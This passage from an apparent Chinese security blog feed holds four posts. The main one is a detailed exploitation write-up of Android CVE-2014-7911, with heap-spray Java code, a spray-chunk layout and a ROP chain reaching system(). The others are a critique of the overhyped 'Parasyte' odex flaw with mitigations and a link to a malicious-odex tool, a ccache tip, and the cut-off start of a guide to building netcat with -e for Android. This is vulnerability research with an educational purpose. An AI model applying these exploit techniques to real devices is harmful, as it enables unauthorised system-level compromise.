<h3 id="汇编代码分析"><a href="#汇编代码分析" class="headerlink" title="汇编代码分析"></a>汇编代码分析</h3><p>注意我这里添加了一张汇编图示，我导入的是没有strip过的libutils.so，这样IDA中解释出的信息更加丰富。<br>下面看一下发生异常时最后调用的RefBase:decStrong的汇编代码。将libutils.so拖入IDA Pro，查看Android::RefBase::decStrong函数。分析时需要牢记的是，攻击者能够控制r0(this指针)：<br><img src="/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_1.png" alt="1"><br><img src="/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_2.png" alt="2"><br>首先对r0的使用，是在decStrong的前下面三行代码之中：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">weakref_impl* <span class="keyword">const</span> refs = mRefs;</div><div class="line">refs-&gt;removeStrongRef(id);</div><div class="line"><span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</div></pre></td></tr></table></figure></p>
<p>对应的汇编代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ldr r4, [r0, #4]   # r0为this指针，r4为mRefs</div><div class="line">mov r6, r1</div><div class="line">mov r0, r4</div><div class="line">blx &lt;android_atomic_dec ()&gt;</div></pre></td></tr></table></figure></p>
<p>首先，mRefs被加载到r4。（r0是drl的this指针，mRefs是虚函数表之后的第一个私有变量，因此mRefs为r0+4所指向的内容）<br>然后，android_atomic_dec函数被调用，传入参数&amp;refs-&gt;mStrong。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</div></pre></td></tr></table></figure></p>
<p>这被翻译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov r0, r4  # r4指向mStrong，r0指向mStrong</div><div class="line">blx &lt;android_atomic_dec ()&gt;</div></pre></td></tr></table></figure></p>
<p>作为函数参数，上述r0就是&amp;refs-&gt;mStrong。注意，mStrong是refs（类weakref_impl）的第一个成员变量，由于weakref_impl没有虚函数，所以没有虚函数表，因此mStrong就是r4所指向的内容。<br>另外，refs-&gt;removeStrongRef(id);这一行并没有出现在汇编代码中，因为这个函数为空实现，编译器进行了优化。如下所示：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">removeStrongRef</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="comment">/*id*/</span>)</span> </span>&#123; &#125;</div></pre></td></tr></table></figure></p>
<p>在调用android_atomic_dec后，出现的是以下代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</div><div class="line">	refs-&gt;mBase-&gt;onLastStrongRef(id);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对应的汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cmp r0, #1          # r0 = refs-&gt;mStrong</div><div class="line">bne.n d1ea</div><div class="line">ldr r0, [r4, #8]    # r4 = &amp;refs-&gt;mStrong</div><div class="line">mov r1, r6</div><div class="line">ldr r3, [r0, #0] </div><div class="line">ldr r2, [r3, #12]</div><div class="line">blx r2</div></pre></td></tr></table></figure></p>
<p>注意，android_atomic_dec函数执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。为了调用refs-&gt;mBase-&gt;onLastStrongRef(id)(即：blx r2)，攻击者需要使refs-&gt;mStrong为1。<br>至此，可以看出攻击者为了实现代码执行，需要满足如下约束条件：</p>
<ol>
<li>drl(就是mOrgue，第一个可控的指针，在进入decStrong函数时的r0)必须指向可读的内存区域;</li>
<li>refs-&gt;mStrong必须为1;</li>
<li>refs-&gt;mBase-&gt;onLastStrongRef(id)需要执行成功。并最终指向可执行的内存区域。即满足：<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</div><div class="line">	refs = *(mOrgue+<span class="number">4</span>);</div><div class="line">	r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">12</span>);</div><div class="line">	blx r2 ; &lt;—— controlled;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>除此以外，攻击者还必须克服Android中的漏洞缓解技术——ASLR和DEP。</p>
</blockquote>
<p>我们可以看到这里使用了三层指针的跳转，最终才拿到控制权。mOrgue需要指向攻击者可控的内存，怎样做到？下面我将结合参考文献以及retme7提供的POC进行翻译和理解。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="绕过ASLR"><a href="#绕过ASLR" class="headerlink" title="绕过ASLR"></a>绕过ASLR</h3><p>Android有做地址空间随机化ASLR，但是所有的app都是fork自zygote进程，基础模块的内存布局全部是相同的，也就是说我们可以简单的绕过system_server的ASLR。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">shell@hammerhead:/ # cat /proc/10156/maps | grep dalvik-heap</div><div class="line">4273c000-616da000 rw-p 00000000 00:04 32910      /dev/ashmem/dalvik-heap (deleted)</div><div class="line">shell@hammerhead:/ # cat /proc/18446/maps | grep dalvik-heap</div><div class="line">4273c000-616da000 rw-p 00000000 00:04 32910      /dev/ashmem/dalvik-heap (deleted)</div></pre></td></tr></table></figure></p>
<h3 id="Dalvik-heap-spary"><a href="#Dalvik-heap-spary" class="headerlink" title="Dalvik-heap spary"></a>Dalvik-heap spary</h3><p>Dalvik-heap是储存Java对象实例的一片由Dalvik虚拟机管理的内存区，它的内存布局也是来自zygote进程，在所有app进程中都是相同的。<br>system_server进程向android设备提供绝大部分的系统服务，通过这些服务的一些特定方法我们可以向system_server传输一个String，同时system_server把这个String存储在Dalvik-heap中不被销毁（因为我们需要使用注入代码段对这片内存区域进行填充）。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapSpary</span><span class="params">(String str)</span> </span>&#123;</div><div class="line"><span class="comment">//    str = str + generateString(16);</span></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        IntentFilter inFilter = <span class="keyword">new</span> IntentFilter();</div><div class="line"><span class="comment">//        inFilter.addAction(generateString(16));</span></div><div class="line">        registerReceiver(broadcastReceiver, inFilter, str, <span class="keyword">null</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我屏蔽了retme7的POC中的两行代码，经过测试并没有影响。<br>首先，看一下registerReceiver方法的声明：</p>
<pre><code>public Intent registerReceiver(BroadcastReceiver receiver, IntentFilter filter, String broadcastPermission, Handler scheduler)
</code></pre><p>其中broadcastPermission参数为一个String类型，方法调用完成后，String buffer将常驻system_server内存空间，并且不会被销毁。接下来，将结合Android4.4.4_r1源码简单分析下registerReceiver方法是如何将String传递进并常驻在system_server进程的：<br><code>ContextWrapper.registerReceiver-&gt;ContextImpl.registerReceiver-&gt;ContextImpl.registerReceiverInternal-&gt;ActivityManagerProxy.registerReceiver-&gt;ActivityManagerService.registerReceiver</code><br>注意ActivityManagerProxy.registerReceiver方法里通过Binder驱动程序就进入到了ActivityManagerService中的registerReceiver方法中，也就是进入到了system_server进程里。<br>贴出ActivityManagerService.registerReceiver方法的关键部分：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Intent <span class="title">registerReceiver</span><span class="params">(IApplicationThread caller, String callerPackage, IIntentReceiver receiver, IntentFilter filter, String permission, <span class="keyword">int</span> userId)</span> </span>&#123;</div><div class="line">enforceNotIsolatedCaller(<span class="string">"registerReceiver"</span>);</div><div class="line">	<span class="keyword">int</span> callingUid;</div><div class="line">	<span class="keyword">int</span> callingPid;</div><div class="line">	<span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</div><div class="line">		......</div><div class="line">	    ReceiverList rl</div><div class="line">	        = (ReceiverList)mRegisteredReceivers.get(receiver.asBinder());</div><div class="line">	    ......</div><div class="line">	    BroadcastFilter bf = <span class="keyword">new</span> BroadcastFilter(filter, rl, callerPackage,</div><div class="line">            permission, callingUid, userId);</div><div class="line">	    rl.add(bf);</div><div class="line">	    ......</div><div class="line">	    <span class="keyword">return</span> sticky;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">BroadcastFilter bf = <span class="keyword">new</span> BroadcastFilter(filter, rl, callerPackage,</div><div class="line">       permission, callingUid, userId);</div><div class="line">rl.add(bf);</div></pre></td></tr></table></figure></p>
<p>就将传递进的String buffer即此处的permission常驻在system_server内存空间。<br>最后反复调用heapSpary，完成Dalvik-heap spary：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++) &#123;</div><div class="line">    heapSpary(str);</div><div class="line">    <span class="keyword">if</span> (i % <span class="number">100</span> == <span class="number">0</span>) &#123;</div><div class="line">        Log.d(TAG, <span class="string">"heap sparying... "</span> + i);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="Spray-addresses-manipulation"><a href="#Spray-addresses-manipulation" class="headerlink" title="Spray addresses manipulation"></a>Spray addresses manipulation</h3><p>方便请见，再次贴出实现代码执行的约束条件：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</div><div class="line">	refs = *(mOrgue+<span class="number">4</span>);</div><div class="line">	r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">12</span>);</div><div class="line">	blx r2 ; &lt;—— controlled;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>完成system_server进程的堆喷射后，我们遇到另一个问题-虽然我们的spray chunk充满了system_server内存空间，mOrgue也确实指向可读的spray chunk，然而我们上面提到由于此漏洞的特殊型，需要控制其三重指针的调用，所以我们还需要构造特殊的spray chunk，使得mOrgue每次指向相同的偏移。<br>下面是构造后的spray chunk的结构图（图来自参考文献）：<br><img src="/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_3.png" alt="3"><br>简单解释一下：<br>STATIC_ADDRESS是我们传递进来的mOrgue<br>GADGET_CHUNK_OFFSET是GADGET_CHUNK在spray chunk的偏移<br>STATIC_ADDRESS = Beginning_of_spray + 4 * N<br>[STATIC_ADDRESS] = STATIC_ADDRESS + GADGET_CHUNK_OFFSET - 4 * N<br>    = Beginning_of_spray + 4 * N + GADGET_CHUNK_OFFSET - 4 * N<br>    = Beginning_of_spray + GADGET_CHUNK_OFFSET<br>    =  GADGET_CHUNK_ADDR<br>这样只要确保STATIC_ADDRESS每次都位于Relative Addresses Chunk区域（spray chunk中Relative Addresses Chunk的比例远大于Gadget Chunk），就可保证STATIC_ADDRESS每次都指向GADGET_CHUNK_ADDR。<br>重新回头分析汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ldr r4, [r0, #4]   # r0为this指针，r4为mRefs</div><div class="line">mov r6, r1</div><div class="line">mov r0, r4</div><div class="line">blx &lt;android_atomic_dec ()&gt;</div><div class="line">cmp r0, #1</div></pre></td></tr></table></figure></p>
<p>为了控制后续程序流程，r0的值必须为1</p>
<pre><code>ldr r4, [r0, #4] --&gt; r4=[STATIC_ADDRESS + 4] --&gt; r4=GADGET_CHUNK_ADDR - 4
</code></pre><p>[r4]的值为1，即[GADGET_CHUNK_ADDR - 4]的值为1。cmp比较成立，进入下面的汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">r4=GADGET_CHUNK_ADDR - 4</div><div class="line">ldr r0, [r4, #8]    # r4 = &amp;refs-&gt;mStrong</div><div class="line">r0=[GADGET_CHUNK_ADDR + 4]</div><div class="line">mov r1, r6</div><div class="line">ldr r3, [r0, #0] </div><div class="line">r3=[[GADGET_CHUNK_ADDR + 4]]</div></pre></td></tr></table></figure></p>
<p>为了方便之后的布局，设置[GADGET_CHUNK_ADDR + 4] =STATIC_ADDRESS + 12，则：<br><code>r3=[STATIC_ADDRESS + 12]</code><br><code>r3=GADGET_CHUNK_ADDR - 12</code><br>接着往下看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ldr r2, [r3, #12]</div><div class="line">r2=[GADGET_CHUNK_ADDR]</div><div class="line">blx r2</div></pre></td></tr></table></figure></p>
<p>这样，我们就完成了spary chunk的布局，Spray addresses manipulation完毕</p>
<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>由于DEP（Data Execution Prevention）的原因，Dalvik堆上的内存不能用来执行。需要通过ROP技术绕过DEP，执行代码（我们选择执行system函数，然后通过system函数调用外部程序）。<br>这里首先用到了一个寻找ROP链的工具：<br><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">https://github.com/JonathanSalwan/ROPgadget</a><br>注意：<br>只用基础模块:libc libandroid_runtime …（会被zygote加载的模块，保证内存布局的一致）<br>可以把arm code当做thumb code来搜索,增加更多的可能<br>为了控制R0寄存器使其指向system函数的参数（命令字符串），我们选择用stack pivot（将控制的堆内存交换栈上,即复写SP）技术将字符串压入堆栈，然后通过pop将字符串地址赋给R0。<br>第一个gadget：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">r5=STATIC_ADDRESS</div><div class="line">ldr r7, [r5]</div><div class="line">r7=GADGET_CHUNK_ADDR</div><div class="line">mov r0, r5</div><div class="line">r0=STATIC_ADDRESS</div><div class="line">ldr r1, [r7, #8]</div><div class="line">r1=[GADGET_CHUNK_ADDR + 8]</div><div class="line">blx r1</div></pre></td></tr></table></figure></p>
<p>通过r1跳转到第二个gadget：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">r7=GADGET_CHUNK_ADDR</div><div class="line">add.w r7, r7, #8</div><div class="line">r7=GADGET_CHUNK_ADDR + 8</div><div class="line">mov sp, r7</div><div class="line">sp = GADGET_CHUNK_ADDR + 8</div><div class="line">pop &#123;r4, r5, r7, pc&#125;</div><div class="line">r4=[GADGET_CHUNK_ADDR + 8]</div><div class="line">r5=[GADGET_CHUNK_ADDR + 12]=system_addr</div><div class="line">r7=[GADGET_CHUNK_ADDR + 16]</div><div class="line">pc=[GADGET_CHUNK_ADDR + 20]</div></pre></td></tr></table></figure></p>
<p>这里我提前将system函数的地址写入[GADGET_CHUNK_ADDR + 12]。<br>有一个问题，为什么要通过第一个gadget的过渡，才完成stack pivot？<br>答:事实上是不得已而为之，我用ROPgadget扫描了整个/system/lib目录下的基础模块的”mov sp, r”，只发现有mov sp, r7，所以只能采取这种过度的方式。<br>继续来到第三个gadget：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sp=[GADGET_CHUNK_ADDR + 24]</div><div class="line">mov r0, sp</div><div class="line">r5=system_addr</div><div class="line">blx r5</div></pre></td></tr></table></figure></p>
<p>如此，我们将命令字符串放在GADGET_CHUNK_ADDR + 24开始的空间就可以了，最终完成了对CVE-2014-7911漏洞的system权限提权，并执行任意代码。</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>虽然retme7大神早就发布了POC,还是把我修改整理过的POC传到github上,就当保存一下。(只适用nexus5 Android4.4.4_r1)<br><a href="https://github.com/ele7enxxh/CVE-2014-7911" target="_blank" rel="external">https://github.com/ele7enxxh/CVE-2014-7911</a></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="http://seclists.org/fulldisclosure/2014/Nov/51" target="_blank" rel="external">http://seclists.org/fulldisclosure/2014/Nov/51</a></li>
<li><a href="http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation" target="_blank" rel="external">http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation</a></li>
<li><a href="http://drops.wooyun.org/papers/6082" target="_blank" rel="external">http://drops.wooyun.org/papers/6082</a></li>
<li><a href="https://github.com/retme7/CVE-2014-7911_poc" target="_blank" rel="external">https://github.com/retme7/CVE-2014-7911_poc</a></li>
<li><a href="https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf" target="_blank" rel="external">https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文对CVE-2014-7911漏洞的原理以及利用进行了详细分析。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>被夸大的安卓漏洞“寄生兽”</title>
    <link href="http://ele7enxxh.com/Exaggerated-Android-Vulnerability-Parasyte.html"/>
    <id>http://ele7enxxh.com/Exaggerated-Android-Vulnerability-Parasyte.html</id>
    <published>2015-07-01T08:43:11.000Z</published>
    <updated>2016-03-23T06:30:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要吐槽了360爆出的寄生兽漏洞，不得不说这个名字取得也真是不靠谱。<a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天下午360安全播报把我吓了一跳，这个洞的描述简直碉堡：</p>
<blockquote>
<p>6月29日，360手机安全研究团队 vulpecker team，向补天漏洞响应平台提交了其发现的安卓app新型通用安全漏洞“寄生兽”，这个漏洞影响市面上数以千万的APP，众多流行APP也包括在内，影响范围包括百度、腾讯、阿里等众多厂商的移动产品。</p>
<p>利用该漏洞的攻击者可以直接在用户手机中植入木马，盗取用户的短信照片等个人隐私，盗取银行、支付宝等账号密码等。目前补天已经将相关详情通知给各大安全应急响应中心，并敦请厂商收到详情及时自查，如果自家app存在相关安全问题，需及时修复。</p>
</blockquote>
<p>再来看一下补天的漏洞描述：</p>
<blockquote>
<p>360 vulpecker team发现了安卓app一种新型的通用安全漏洞，这个漏洞影响市面上众多流行APP的远程代码执行漏洞，影响范围包括百度、腾讯、阿里等众多厂商的移动产品，利用该漏洞的攻击者可以直接在用户手机中植入木马，盗取用户的短信照片等个人隐私，盗取银行、支付宝等账号密码等。</p>
</blockquote>
<p>提取下关键信息，漏洞影响千万APP，包括百度、腾讯、阿里的产品，通用安全漏洞，远程代码执行漏洞。<br>果真如此的话，这个漏洞简直犀利。</p>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>今天早上看到了部分细节：<br><a href="http://www.aqniu.com/threat-alert/8371.html" target="_blank" rel="external">http://www.aqniu.com/threat-alert/8371.html</a><br>以及下午360自己在乌云公布的详细分析：<br><a href="http://drops.wooyun.org/papers/6910" target="_blank" rel="external">http://drops.wooyun.org/papers/6910</a><br>简单描述一下漏洞细节，APP在调用DexClassLoader函数动态加载插件时，如果函数第二个参数指定的odex文件存在，则会再一个简单的弱校验通过后直接加载该odex。<br>然而该漏洞是否向360描述的那般强大呢？接下来我将通过360提出的4种攻击场景介绍漏洞的局限：<br><strong>1）三星输入法远程命令执行漏洞</strong><br>CVE-2014-2865漏洞描述：</p>
<blockquote>
<p>在能够劫持你的网络前提下,攻击者能够利用三星自带输入法更新机制进行远程代码执行并且具有 system 权限。Swift输入法预装在三星手机中并且不能卸载和禁用.即使修改了默认输入法,这个漏洞也是可以利用的。</p>
</blockquote>
<p>由于Swift输入法具有system权限，可以直接替换/data/dalvik-cache目录下任意app的缓存文件。然而这个漏洞利用有着较大的局限性：</p>
<ol>
<li>设备为S4 Mini, S4, S5, S6在内的Samsung Galaxy S手机CVE</li>
<li>手机接入了一个不安全的网络环境中，使得攻击者进行中间人劫持</li>
</ol>
<p><strong>2）利用zip解压缩漏洞覆盖缓存代码</strong><br>app对zip文件进行解压遍历文件时，会调用ZipEntry.getName()方法，这个方法在官方文档描述了一个安全警告：<br>链接：<a href="http://developer.android.com/reference/java/util/zip/ZipEntry.html#getName(" target="_blank" rel="external">http://developer.android.com/reference/java/util/zip/ZipEntry.html#getName(</a>) Gets the name of this ZipEntry</p>
<blockquote>
<p>Security note: Entry names can represent relative paths. foo/../bar or ../bar/baz ,<br>for example. If the entry name is being used to construct a filename or as a path<br>component, it must be validated or sanitized to ensure that files are not written outside<br>of the intended destination directory.</p>
</blockquote>
<p>那么实际上，这是由于app开发者无视了这个安全警告，在调用ZipEntry.getName()方法后，没有对”../“跳转符做过滤，导致了目录遍历，使得app在解压恶意zip压缩包时以本app的权限覆盖了缓存文件。<br>局限性：</p>
<ol>
<li>app需要有解压zip压缩包的功能</li>
<li>不专业的app开发者</li>
<li>需要向被攻击者发送一个zip压缩包，并诱使被攻击者用该app解压或者手机接入了一个不安全的网络环境中，使得攻击者进行中间人劫持</li>
</ol>
<p><strong>3）利用adb backup覆盖缓存代码</strong><br>通过adb连接手机，使用adb backup备份app私有数据，对odex进行篡改后，使用adb restore恢复数据完成odex的替换。<br>局限性：</p>
<ol>
<li>manifest文件里没有指定allowBackup=”false” </li>
</ol>
<p><strong>4）其他可能的APP数据读写</strong><br>以root权限直接替换任意app的缓存文件。<br>局限性：</p>
<ol>
<li>当攻击者拥有了root权限，还需要替换odex这种繁琐的植入方式？？？</li>
</ol>
<h2 id="真相"><a href="#真相" class="headerlink" title="真相"></a>真相</h2><p>实际上大部分app都会将插件的缓存文件存放在私有目录下，由于Android的沙箱机制，攻击者要利用这个漏洞首先需要突破沙箱保护。可以看到，360提出的4种攻击场景全部利用了其他的漏洞或者app开发者的粗心大意，从而突破了沙箱保护。<br>另一方面，由于odex文件与VM版本相关，同一个odex无法在多个设备中正常运行，攻击者需要对识别不同的设备并适配不同的恶意odex，漏洞利用成本进一步加大。<br>总结一下漏洞利用成功的先决条件：</p>
<ol>
<li>Android版本低于5.0</li>
<li>利用了其他可突破沙箱保护的漏洞</li>
<li>适配设备的odex文件实例</li>
</ol>
<p>通过上面的分析，“寄生兽”漏洞虽然具有一定的影响面，然而这个漏洞的利用需要另外一个漏洞的帮助（用来突破沙箱保护），远远没有达到360对其描述的危害性。<br>引用网上(知乎id:shotgun)对这个漏洞的评价：</p>
<blockquote>
<p>这个漏洞的利用需要另外一个漏洞的帮助，不知道为什么我就想起了“太阳能电筒”。<br><img src="/images/Exaggerated-Android-Vulnerability-Parasyte_1.jpg" alt="1"><br>简单来说，这个漏洞必须要有能访问到私有目录的权限才能运行，所以需要一个能提供类似权限的其他漏洞，比如之前的三星虚拟键盘漏洞。</p>
<p>“这是无需电池的太阳能电筒。”<br>“那没有光呢？”<br>“它绝对不会亮！”<br>“有没有可能没有光也亮呢？”<br>“你可以用另外一只电筒照着它！”<br>“哦……”</p>
</blockquote>
<h2 id="防范与修复"><a href="#防范与修复" class="headerlink" title="防范与修复"></a>防范与修复</h2><p>如何防范？<br>从用户角度来看：</p>
<ol>
<li>升级Android版本到5.0以上</li>
<li>不要打开并解压来源不可信的zip压缩包</li>
<li>手机不要接入不安全的wifi无线热点</li>
<li>不要轻易root手机、已root手机管理好app的授权</li>
<li>不要通过adb连接到不可信的设备</li>
</ol>
<p>如何修复？</p>
<ol>
<li>每次调用DexClassLoader方法之前，清楚已经存在的odex</li>
<li>DexClassLoader方法的第二个参数（即odex的存放路径）不要指定在sdcard上</li>
<li>在调用zipEntry.getName()的时候，过滤返回值中的”../“跳转符</li>
<li>没有必要的情况下，请在manifest文件里显示指定allowBackup=”false” </li>
</ol>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>这里提供一个修改odex文件crc和modWhen的代码：<br><a href="https://github.com/ele7enxxh/FakeOdex" target="_blank" rel="external">https://github.com/ele7enxxh/FakeOdex</a><br>可用来生成一个恶意的odex，绕过弱检测。<br>PS：本人水平有限，上面的理解如果有错误，还请海涵。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要吐槽了360爆出的寄生兽漏洞，不得不说这个名字取得也真是不靠谱。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用ccache为编译android源码加速</title>
    <link href="http://ele7enxxh.com/Use-Ccache-To-Speed-Up-Android-Compilation.html"/>
    <id>http://ele7enxxh.com/Use-Ccache-To-Speed-Up-Android-Compilation.html</id>
    <published>2015-06-23T05:29:24.000Z</published>
    <updated>2016-03-23T06:31:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍了如何使用ccache为编译android源码加速。<a id="more"></a></p>
<p>设置环境变量：<br>export USE_CCACHE=1<br>设置缓冲目录（默认为当前用户目录下的.ccahe）：<br>export CCACHE_DIR=your path<br>在源码根目录下运行，一般为50G-100G：<br>prebuilts/misc/linux-x86/ccache/ccache -M 50G<br>搞定！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍了如何使用ccache为编译android源码加速。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>为Android编译带-e选项的netcat</title>
    <link href="http://ele7enxxh.com/Compile-Netcat-For-Android.html"/>
    <id>http://ele7enxxh.com/Compile-Netcat-For-Android.html</id>
    <published>2015-03-06T09:10:20.000Z</published>
    <updated>2016-03-23T06:30:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍了如何为Android编译带-e选项的netcat。<a id="more"></a></p>
<p>环境<br>OS：Ubuntu14.04 64</p>
<h2 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h2><p>首先到<a href="http://www.busybox.net/" target="_blank" rel="external">这里</a>下载busybox源码，这里我下载的版本为1.23.1。<br>搭建交叉编译环境：<br><code>apt-get install gcc-arm-linux-gnueabi libc-dev-armel-cross</code><br>在busybox目录下执行：<br><code>make menuconfig</code><br>进入图形选择模式，必填的选项为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Busybox Settings-&gt;General Configuration-&gt;</div><div class="line">[*]Don&apos;t use /usr</div><div class="line">Busybox Settings-&gt;Build Options-&gt;</div><div class="line">[*] Build BusyBox as a static binary (no shared libs)</div><div class="line">(arm-linux-gnueabi-) Cross Compiler prefix</div><div class="line">Networking Utilities-&gt;</div><div class="line">[*] Netcat 1.10 compatibility (+2.5k)</div></pre></td></tr></table></figure></p>
<p>保存设置退出menuconfig，执行：<br><code>make -j8</code><br>成功后会在当前目录生产busybox，通过busybox nc即可调用netcat。</p>
<h2 id="编译netcat"><a href="#编译netcat" class="headerlink" title="编译netcat"></a>编译netcat</h2><p>由于不能直接从busybox单独的提取出netcat命令，所以使用郑郭busybox稍显臃肿（strip版本大概为2m），所以我又决定直接对netcat源码进行交叉编译。<br>首先到<a href="http://netcat.sourceforge.net/" target="_blank" rel="external">这里</a>下载netcat源码这里我下载的版本是0.7.1。<br>这里可以采用两种编译手段：</p>
<ol>
